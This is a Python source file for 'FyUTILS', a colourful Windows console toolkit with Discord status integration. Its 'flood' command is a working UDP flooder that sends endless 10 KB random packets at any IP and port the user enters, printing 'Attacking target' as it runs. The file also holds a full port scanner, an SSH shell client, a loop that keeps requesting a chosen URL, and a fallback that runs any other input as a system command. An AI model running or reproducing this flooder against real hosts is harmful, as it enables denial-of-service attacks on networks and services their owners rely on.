import datetime
import getpass
import os
import platform
import random
import socket
import sys
import threading
import time

import paramiko
import requests
from colorama import Fore, init
from pypresence import Presence

init(convert=True)


def color(): return Fore.LIGHTBLUE_EX


def accent_color(): return Fore.LIGHTBLACK_EX


def text_color(): return Fore.WHITE


def prefix(type):
    if threading.current_thread().name == "MainThread":
        current_thread_name = "FyUTILS"
    else:
        current_thread_name = threading.current_thread().name

    if type == "INFO":
        return accent_color() + "[" + color() + datetime.datetime.now().strftime("%H:%M:%S") + accent_color() + "]" + " " + accent_color() + "[" + text_color() + current_thread_name + accent_color() + "/" + Fore.LIGHTGREEN_EX + "INFO" + accent_color() + "] " + text_color()
    elif type == "ERROR":
        return accent_color() + "[" + color() + datetime.datetime.now().strftime("%H:%M:%S") + accent_color() + "]" + " " + accent_color() + "[" + text_color() + current_thread_name + accent_color() + "/" + Fore.RED + "ERROR" + accent_color() + "] " + text_color()
    elif type == "INIT":
        return accent_color() + "[" + color() + datetime.datetime.now().strftime("%H:%M:%S") + accent_color() + "]" + " " + accent_color() + "[" + text_color() + current_thread_name + accent_color() + "/" + color() + "INIT" + accent_color() + "] " + text_color()
    else:
        return accent_color() + "[" + color() + datetime.datetime.now().strftime("%H:%M:%S") + accent_color() + "]" + " " + accent_color() + "[" + text_color() + current_thread_name + accent_color() + "/" + Fore.WHITE + str(type).upper() + accent_color() + "] " + text_color()


def update_status(status):
    os.system("title FyUTILS " + version + " - " + username + "@" + device + " - " + status)
    try:
        rpc.update(
            state=status, details=username + "@" + device, small_image="python",
            large_image="main",
            buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
            small_text="Python", large_text="FyUTILS v" + version,
            start=int(rpc_start_time))
    except:
        None


def update_ssh_status(status):
    os.system("title FyUTILS " + version + " - " + username + "@" + device + " - " + status)
    try:
        rpc.update(
            state="[SSH] " + status, details=username + "@" + device, small_image="python",
            large_image="main",
            buttons=[{"label": "Get FyUTILS", "url": "https://github.com/NoahOnFyre/FyUTILS/releases/latest"}],
            small_text="Python", large_text="FyUTILS v" + version,
            start=int(rpc_start_time))
    except:
        None


def menu():
    os.system("cls")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "  __________               _____  __   ________   ________   ______       ________")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "  ___  ____/  _____  __    __  / / /   ___  __/   ____  _/   ___  /       __  ___/")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "  __  /_      __  / / /    _  / / /    __  /       __  /     __  /        _____ \ ")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "  _  __/      _  /_/ /     / /_/ /     _  /       __/ /      _  /___      ____/ / ")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "  /_/         _\__, /      \____/      /_/        /___/      /_____/      /____/  ")
    time.sleep(0.03)
    print(Fore.LIGHTBLUE_EX + "              /____/                                                              ")
    time.sleep(0.03)
    print("")
    time.sleep(0.03)
    print(accent_color() + "╔" + "═"*119)
    time.sleep(0.03)
    print(accent_color() + "║ " + accent_color() + "[" + color() + "VAR" + accent_color() + "] " + text_color() + "Username: " + username)
    time.sleep(0.03)
    print(accent_color() + "║ " + accent_color() + "[" + color() + "VAR" + accent_color() + "] " + text_color() + "Device: " + device)
    time.sleep(0.03)
    print(accent_color() + "║ " + accent_color() + "[" + color() + "VAR" + accent_color() + "] " + text_color() + "Directory: " + current_dir)
    time.sleep(0.03)
    print(accent_color() + "║ " + accent_color() + "[" + color() + "VAR" + accent_color() + "] " + text_color() + "Version: " + version)
    time.sleep(0.03)
    print(accent_color() + "╚" + "═"*119)


# INIT PHASE

# Variable initialisation
try:
    print(prefix("INIT") + "Initializing system variables...")
    username = os.getlogin()
    print(prefix("INIT") + "Username: " + username)
    device = platform.node()
    print(prefix("INIT") + "Device: " + device)
    current_dir = sys.path.__getitem__(0)
    print(prefix("INIT") + "Directory: " + current_dir)
    version = "1.0.0"
    print(prefix("INIT") + "Version: " + version)
except:
    print(prefix("ERROR") + "Failed to get system variables!")
    print(prefix("INIT") + "Setting default values...")
    time.sleep(0.05)
    username = "USERNAME"
    print(prefix("INIT") + "Username: " + username)
    device = "DEVICE"
    print(prefix("INIT") + "Device: " + device)
    current_dir = "\\"
    print(prefix("INIT") + "Directory: " + current_dir)
    version = 1.0
    print(prefix("INIT") + "Version: " + version)
    time.sleep(0.5)

# Discord RPC initialisation
try:
    print(prefix("INIT") + "Initializing discord rich presence... (RPC)")
    rpc = Presence("1005822803997638696")
    print(prefix("INIT") + "Presence ID set to: '1005822803997638696'.")
    print(prefix("INIT") + "Connecting to discord...")
    rpc.connect()
    print(prefix("INIT") + "Discord is connected...")
    rpc_start_time = time.time()
    print(prefix("INIT") + "Discord start timestamp set...")
    update_status("Starting up...")
except:
    print(prefix("ERROR") + "Can't connect with the discord RPC.")
    time.sleep(0.5)

print("")

# INIT PHASE END

menu()
while True:
    print("")
    update_status("Idle")
    try:
        cmd = input(accent_color() + "╔═══(" + color() + username + accent_color() + "@" + text_color() + device + accent_color() + ")\n" + accent_color() + "╚═══> " + text_color())
    except KeyboardInterrupt:
        try:
            update_status("Shutting down...")
            print("\n" + prefix("INFO") + "Shutting down FyUTILS...")
            time.sleep(1)
            sys.exit()
        except KeyboardInterrupt:
            continue

    match cmd.lower():
        case "flood":
            print("")
            print(accent_color() + "╔" + "═" * 119)
            try:
                floodtarget = input(
                    accent_color() + "║ " + text_color() + "Target IP" + accent_color() + " > " + text_color())
                floodport = int(input(
                    accent_color() + "║ " + text_color() + "Target port" + accent_color() + " > " + text_color()))
                activity_start = time.time()
                update_status(floodtarget + ":" + str(floodport))
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.connect((floodtarget, floodport))
                print(accent_color() + "╚" + "═" * 119)
                print("")
                try:
                    for i in range(sys.maxsize):
                        sock.send(random.randbytes(10240))
                        print(prefix("INFO") + "Attacking target: " + color() + floodtarget + accent_color() + ":" + color() + str(floodport) + text_color() + "..." + accent_color() + " - " + text_color() + "Attack: " + color() + str(i + 1) + accent_color(), end='\r')

                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix("INFO") + text_color() + "Canceling Action...")
                except:
                    print("\n" + prefix("ERROR") + text_color() + "Target doesn't respond!")
                    time.sleep(3)
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                print(prefix("INFO") + "Disconnecting from " + color() + floodtarget + accent_color() + ":" + color() + str(floodport) + text_color() + "...")
                try:
                    sock.close()
                    time.sleep(0.1)
                except:
                    print(prefix("ERROR") + "Cannot disconnect from target!")
                print(prefix("INFO") + "Cleaning up...\n")
            except:
                continue

        case "portscan":
            print("")
            print(accent_color() + "╔" + "═" * 119)
            try:
                scantarget = input(
                    accent_color() + "║ " + text_color() + "Target IP" + accent_color() + " > " + text_color())
                activity_start = time.time()
                update_status(scantarget)
                print(accent_color() + "╚" + "═" * 119)
                print("")
                try:
                    print(prefix("INFO") + "Preparing scan.", end='\r')
                    time.sleep(0.1)
                    print(prefix("INFO") + "Preparing scan..", end='\r')
                    time.sleep(0.1)
                    print(prefix("INFO") + "Preparing scan...", end='\r')
                    for scanport in range(1, 65535):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        socket.setdefaulttimeout(0.05)
                        result = sock.connect_ex((scantarget, scanport))
                        print(prefix("INFO") + "Scanning Port... " + color() + str(scanport), end='\r')
                        if result == 0:
                            print(prefix("INFO") + "Port " + color() + str(scanport) + text_color() + " is open!                ")
                        sock.close()
                    print("\n")
                except KeyboardInterrupt:
                    print("\n" + prefix("INFO") + "Canceling Action...")
                except:
                    print("\n" + prefix("ERROR") + "Target doesn't respond!")
                    time.sleep(3)
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix(
                    "INFO") + "Disconnecting from " + color() + scantarget + accent_color() + ":" + color() + str(
                    scanport) + text_color() + "...")
                try:
                    sock.close()
                    time.sleep(0.1)
                except:
                    print(prefix("ERROR") + "Cannot disconnect from target!")
                print(prefix("INFO") + "Cleaning up...\n")
            except:
                continue

        case "ssh":
            print("")
            print(accent_color() + "╔" + "═" * 119)
            update_ssh_status("Logging in...")
            ssh_server = input(accent_color() + "║ " + text_color() + "Host IP" + accent_color() + " > " + text_color())
            ssh_port = input(accent_color() + "║ " + text_color() + "Host port (default: 22)" + accent_color() + " > " + text_color())
            if ssh_port == "":
                ssh_port = 22
            else:
                ssh_port = int(ssh_port)
            ssh_user = input(accent_color() + "║ " + text_color() + "Login (default: " + username + ")" + accent_color() + " > " + text_color())
            if ssh_user == "":
                ssh_user = username
            else:
                ssh_user = ssh_user
            ssh_password = getpass.getpass(accent_color() + "║ " + text_color() + "Password" + accent_color() + " > " + text_color())
            print(accent_color() + "╚" + "═" * 119)
            print("")
            activity_start = time.time()
            update_ssh_status("Connecting...")
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(ssh_server, port=ssh_port, username=ssh_user, password=ssh_password)
            except Exception as e:
                print(prefix("ERROR") + "Can't connect to SSH host. Please make sure, that the requested port is open.")
                print(prefix("ERROR") + "SSH error: " + str(e))
                print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
                print(prefix("INFO") + "Cleaning up...\n")
                continue
            while True:
                try:
                    update_ssh_status("Idle")
                    ssh_cmd = input(accent_color() + "╔═══[" + Fore.LIGHTMAGENTA_EX + ssh_user + accent_color() + "@" + Fore.LIGHTMAGENTA_EX + ssh_server + accent_color() + ":" + Fore.LIGHTMAGENTA_EX + str(ssh_port) + accent_color() + "]═══(" + color() + "FySSH " + text_color() + version + accent_color() + ")" + "\n" + "╚═══" + accent_color() + "> " + text_color())
                    ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command(ssh_cmd)
                    update_ssh_status("Running: " + ssh_cmd)
                    print("")
                    for line in ssh_stdout.readlines():
                        print(prefix("INFO") + line, end="\r")
                    for line in ssh_stderr.readlines():
                        print(prefix("ERROR") + line, end="\r")
                except KeyboardInterrupt:
                    break

            print("\n" + prefix("INFO") + "Canceling Action...")
            print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start : 0.2f}s")
            print(prefix("INFO") + "Disconnecting from " + color() + ssh_server + accent_color() + ":" + color() + str(ssh_port) + text_color() + "...")
            try:
                ssh.close()
                time.sleep(0.1)
            except:
                print(prefix("ERROR") + "Cannot disconnect from target!")
            print(prefix("INFO") + "Cleaning up...\n")

        case "display":
            print("")
            print(accent_color() + "╔" + "═" * 119)
            try:
                display_target = input(accent_color() + "║ " + text_color() + "Enter URL" + accent_color() + " > " + text_color())
                print(accent_color() + "╚" + "═" * 119)
                print("")
                activity_start = time.time()
                update_status("Displaying: " + str(display_target))
                try:
                    while True:
                        display_ping = time.time()
                        requests.get(display_target)
                        print(prefix("INFO") + f"Ping request succeed! - Ping: {time.time() - display_ping : 0.2f}s")
                        time.sleep(0.5)
                except requests.exceptions.ConnectionError:
                    print(prefix("ERROR") + "Could not connect to '" + display_target + "'. Check your spelling and try again!")
                    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print("")
                except:
                    print("\n" + prefix("INFO") + "Canceling Action...")
                    print(prefix("INFO") + f"Time elapsed: {time.time() - activity_start: 0.2f}s")
                    print("")
            except:
                continue

        case "":
            None

        case "restart":
            os.system("start " + current_dir + "\\main.py")
            sys.exit()
        
        case "exit":
            try:
                update_status("Shutting down...")
                print(prefix("INFO") + "Shutting down FyUTILS...")
                time.sleep(1)
                sys.exit()
            except KeyboardInterrupt:
                None

        case "clear":
            menu()

        case "rl":
            menu()

        case "cls":
            menu()

        case _:
            os.system(cmd)
